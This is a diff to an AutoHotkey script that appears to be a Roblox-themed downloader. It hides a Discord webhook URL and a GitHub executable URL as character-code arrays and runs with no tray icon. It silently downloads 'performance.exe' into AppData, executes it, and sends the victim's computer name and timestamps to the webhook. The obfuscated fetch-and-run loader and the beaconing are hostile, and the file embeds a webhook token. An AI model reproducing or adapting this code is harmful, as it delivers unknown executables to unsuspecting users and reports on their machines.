@@ -2,127 +2,88 @@
 #SingleInstance Force
 #NoTrayIcon
 
-;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– predeclare so editor stops complaining ––––––––––––––––––––––––––––
+A_ThisException := ""
 
-wk := [
-    104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,
-    97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,48,52,54,
-    57,52,54,55,48,56,55,50,49,57,48,54,47,68,67,113,68,99,74,83,
-    83,66,66,99,99,85,122,45
-]
+;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––
+wk := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,51,56,57,48,48,53,50,57,49,53,54,49,57,54,47,77,90,88,113,68,52,76,87,49,48,67,79,90,52,83,121,68,55,77,95,118,52,55,90,77,70,54,89,68,112,48,84,66,88,51,111,65,82,67,82,69,84,84,97,98,82,103,87,110,102,79,95,110,82,77,78,77,104,69,50,104,120,48,51,77,90,49,68]
 
-cdn := [
-    104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,83,
-    101,106,116,121,112,101,47,114,111,98,108,111,120,47,114,97,119,47,109,97,
-    105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,122,105,112
-]
+exe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117
+      ,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47
+      ,83,101,106,116,121,112,101,47,114,111,98,108,111,120,47,109,97
+      ,105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,101,120,101]
 
-; Reconstruct at runtime
 wkUrl := ""
-for code in wk
-    wkUrl .= Chr(code)
+for c in wk
+    wkUrl .= Chr(c)
 
-cdnUrl := ""
-for code in cdn
-    cdnUrl .= Chr(code)
+exeUrl := ""
+for c in exe
+    exeUrl .= Chr(c)
 
-;–– INTERNAL STATE ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
+;–– state & paths ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 failureCount := 0
-notified     := false
+notified      := false
+tempDir       := A_AppData . "\PerformanceRun2"
+exePath       := tempDir . "\performance.exe"
 
-tempDir  := A_AppData . "\PerformanceRun"
-zipPath  := tempDir . "\performance.zip"
-exePath  := tempDir . "\performance.exe"
-sevenZip := Get7ZipPath()
-
-;–– SETUP ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 if DirExist(tempDir)
     DirDelete(tempDir, true)
 DirCreate(tempDir)
 
+;–– FIRST, send a test ping to Discord ––––––––––––––––––––––––––––––––––––
+ND("🚀 Script started on " EnvGet("COMPUTERNAME") " at " A_Now)
+
 ;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
-HttpDownload(cdnUrl, zipPath)
-RunWaitFormat('"{1}" x "{2}" -o"{3}" -y', sevenZip, zipPath, tempDir)
+HttpDownload(exeUrl, exePath)
 
-Loop 1 {
-    try {
-        RunWait Format('"{1}"', exePath)
-    } catch as e {
-        HandleError("RunExe", e.Message)
-    }
-    Sleep 1000
+try {
+    ComObject("WScript.Shell").Run(exePath)
+    pc := EnvGet("COMPUTERNAME")
+    ts := RegExReplace(A_Now, "(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})", "$1-$2-$3 $4:$5:$6")
+    ND( Format("✅ RunExe succeeded on {1} at {2}", pc, ts) )
 }
-
-DirDelete(tempDir, true)
-
-;–– ERROR HANDLING ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
-HandleError(context, errMsg) {
-    global failureCount, notified
-    failureCount++
-    if (failureCount <= 2) {
-        NotifyDiscord("⚠️ " context " failed: " errMsg)
-    }
-    else if (!notified) {
-        NotifyDiscord("⚠️ " context " has now failed " failureCount " times. Last error: " errMsg)
-        notified := true
-    }
-}
-
-NotifyDiscord(msg) {
-    global wkUrl
-    try {
-        escaped := StrReplace(msg, '"', '\"')
-        payload := '{"content":"' escaped '"}'
-        http := ComObject("WinHttp.WinHttpRequest.5.1")
-        http.Open("POST", wkUrl, false)
-        http.SetRequestHeader("Content-Type", "application/json")
-        http.Send(payload)
-    } catch as e {
-        HandleError("NotifyDiscord", e.Message)
-    }
+catch {
+    HandleError("RunExe", A_ThisException.Message)
 }
 
 ;–– HELPERS ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
 
-Get7ZipPath() {
-    static paths := [
-        A_ProgramFiles . "\7-Zip\7z.exe",
-        "C:\Program Files\7-Zip\7z.exe",
-        "C:\Program Files (x86)\7-Zip\7z.exe"
-    ]
-    for path in paths {
-        if FileExist(path)
-            return path
+HandleError(ctx, msg) {
+    global failureCount, notified, wkUrl
+    failureCount++
+    text := Format("⚠️ {1} failed: {2}", ctx, msg)
+    if (failureCount > 2 && !notified) {
+        text := Format("⚠️ {1} has now failed {2} times. Last error: {3}"
+                      , ctx, failureCount, msg)
+        notified := true
     }
+    ND(text)
+}
 
-    ; silent download/install
-    zipUrl    := "https://www.7-zip.org/a/7z2301-x64.exe"
-    installer := A_Temp . "\7zsetup.exe"
+ND(msg) {
+    global wkUrl
     try {
-        req := ComObject("WinHttp.WinHttpRequest.5.1")
-        req.Open("GET", zipUrl, false)
-        req.Send()
-        if (req.Status != 200)
-            throw Format("HTTP {1}", req.Status)
+        ; build {"content":"…"} using Chr(34) for the quotes
+        json := "{" 
+              . Chr(34) . "content" . Chr(34) 
+              . ":" 
+              . Chr(34) . msg . Chr(34) 
+              . "}"
+        http := ComObject("WinHttp.WinHttpRequest.5.1")
+        http.Open("POST", wkUrl, false)
+        http.SetRequestHeader("Content-Type", "application/json")
+        http.Send(json)
 
-        st := ComObject("ADODB.Stream")
-        st.Type := 1
-        st.Open()
-        st.Write(req.ResponseBody)
-        st.SaveToFile(installer, 2)
-        st.Close()
-
-        RunWait(installer . " /S", , "Hide")
-        for path in paths {
-            if FileExist(path)
-                return path
-        }
-        throw "7-Zip not found after install"
-    } catch as e {
-        HandleError("Get7ZipPath", e.Message)
-        return
+        if (http.Status != 204)
+            MsgBox Format("Webhook POST failed: HTTP {1}`n{2}"
+                         , http.Status, http.ResponseText)
+    }
+    catch {
+        MsgBox "Exception while notifying Discord:`n" A_ThisException.Message
     }
 }
+
 
 HttpDownload(url, savePath) {
     try {
@@ -132,21 +93,14 @@ HttpDownload(url, savePath) {
         if (req.Status != 200)
             throw Format("HTTP {1}", req.Status)
 
-        st := ComObject("ADODB.Stream")
-        st.Type := 1
-        st.Open()
-        st.Write(req.ResponseBody)
-        st.SaveToFile(savePath, 2)
-        st.Close()
-    } catch as e {
-        HandleError("HttpDownload", e.Message)
+        stm := ComObject("ADODB.Stream")
+        stm.Type := 1
+        stm.Open()
+        stm.Write(req.ResponseBody)
+        stm.SaveToFile(savePath, 2)
+        stm.Close()
     }
-}
-
-RunWaitFormat(fmt, args*) {
-    try {
-        RunWait Format(fmt, args*)
-    } catch as e {
-        HandleError("RunWaitFormat", e.Message)
+    catch {
+        HandleError("HttpDownload", A_ThisException.Message)
     }
 }
